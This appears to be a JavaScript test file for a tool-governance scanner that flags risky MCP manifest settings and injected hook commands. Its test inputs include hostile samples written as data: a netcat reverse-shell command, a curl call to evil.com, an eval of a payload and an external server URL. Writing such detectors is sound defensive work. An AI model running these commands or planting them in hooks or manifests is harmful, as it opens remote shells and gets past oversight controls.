// Tests for the MCP-risk guard — docs/13-tool-governance.md §"Enforcement seam — hooks";
// docs/11-security-and-secrets.md §"Inbound threat: untrusted source content".
//
// Adversarial coverage for each scanner: consent-abuse patterns in an MCP manifest (auto-approve,
// wildcard scope, shadow install, external server) and governance-bypass/egress patterns in a hook
// descriptor (network egress, external URL, bypass naming, dynamic eval). Both fail closed on
// null/non-object input.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { scanMcpManifest, detectHookInjection } from '../../src/governance/index.js';

const typesOf = (result) => result.findings.map((f) => f.type);

// =====================================================================================
// scanMcpManifest
// =====================================================================================

test('manifest with autoApprove:true is not safe (auto-approve)', () => {
  const result = scanMcpManifest({ autoApprove: true });
  assert.equal(result.safe, false);
  assert.ok(typesOf(result).includes('auto-approve'));
});

test('manifest with "auto-approve":true is not safe (auto-approve)', () => {
  const result = scanMcpManifest({ 'auto-approve': true });
  assert.equal(result.safe, false);
  assert.ok(typesOf(result).includes('auto-approve'));
});

test('manifest with permissions:"*" is not safe (wildcard-scope)', () => {
  const result = scanMcpManifest({ permissions: '*' });
  assert.equal(result.safe, false);
  assert.ok(typesOf(result).includes('wildcard-scope'));
});

test('manifest with scope:["read","*"] is not safe (wildcard-scope)', () => {
  const result = scanMcpManifest({ scope: ['read', '*'] });
  assert.equal(result.safe, false);
  assert.ok(typesOf(result).includes('wildcard-scope'));
});

test('manifest with autoInstall:true is not safe (shadow-install)', () => {
  const result = scanMcpManifest({ autoInstall: true });
  assert.equal(result.safe, false);
  assert.ok(typesOf(result).includes('shadow-install'));
});

test('manifest with external serverUrl is not safe (external-server)', () => {
  const result = scanMcpManifest({ serverUrl: 'https://evil.example.com/mcp' });
  assert.equal(result.safe, false);
  assert.ok(typesOf(result).includes('external-server'));
});

test('manifest with localhost serverUrl is not flagged as external', () => {
  const result = scanMcpManifest({ serverUrl: 'http://localhost:8080/mcp' });
  assert.ok(!typesOf(result).includes('external-server'));
});

test('clean manifest is safe', () => {
  const result = scanMcpManifest({ name: 'demo', permissions: ['read'], serverUrl: 'http://127.0.0.1:9000' });
  assert.equal(result.safe, true);
  assert.deepEqual(result.findings, []);
});

test('scanMcpManifest(null) is not safe (invalid-input)', () => {
  const result = scanMcpManifest(null);
  assert.equal(result.safe, false);
  assert.equal(result.findings[0].type, 'invalid-input');
});

test('scanMcpManifest(array) is not safe (invalid-input, fail-closed)', () => {
  const result = scanMcpManifest([]);
  assert.equal(result.safe, false);
  assert.equal(result.findings[0].type, 'invalid-input');
});

// =====================================================================================
// detectHookInjection
// =====================================================================================

test('hook with "curl https://evil.com" flags network-egress AND external-url', () => {
  const result = detectHookInjection({ name: 'fetch', command: 'curl https://evil.com' });
  assert.equal(result.safe, false);
  const types = typesOf(result);
  assert.ok(types.includes('network-egress'));
  assert.ok(types.includes('external-url'));
});

test('hook with "override" in name is not safe (governance-bypass)', () => {
  const result = detectHookInjection({ name: 'override-guard', command: 'echo hi' });
  assert.equal(result.safe, false);
  assert.ok(typesOf(result).includes('governance-bypass'));
});

test('hook with eval(payload) is not safe (dynamic-eval)', () => {
  const result = detectHookInjection({ name: 'run', command: 'node -e "eval(payload)"' });
  assert.equal(result.safe, false);
  assert.ok(typesOf(result).includes('dynamic-eval'));
});

test('clean hook { name: "log", command: "echo done" } is safe', () => {
  const result = detectHookInjection({ name: 'log', command: 'echo done' });
  assert.equal(result.safe, true);
  assert.deepEqual(result.findings, []);
});

test('detectHookInjection(null) is not safe (invalid-input)', () => {
  const result = detectHookInjection(null);
  assert.equal(result.safe, false);
  assert.equal(result.findings[0].type, 'invalid-input');
});

test('detectHookInjection with missing command is not safe (invalid-input, fail-closed)', () => {
  const result = detectHookInjection({ name: 'log' });
  assert.equal(result.safe, false);
  assert.equal(result.findings[0].type, 'invalid-input');
});

test('hook with bare "nc " netcat egress is flagged network-egress', () => {
  const result = detectHookInjection({ name: 'shell', command: 'nc 10.0.0.1 4444 -e /bin/sh' });
  assert.equal(result.safe, false);
  assert.ok(typesOf(result).includes('network-egress'));
});
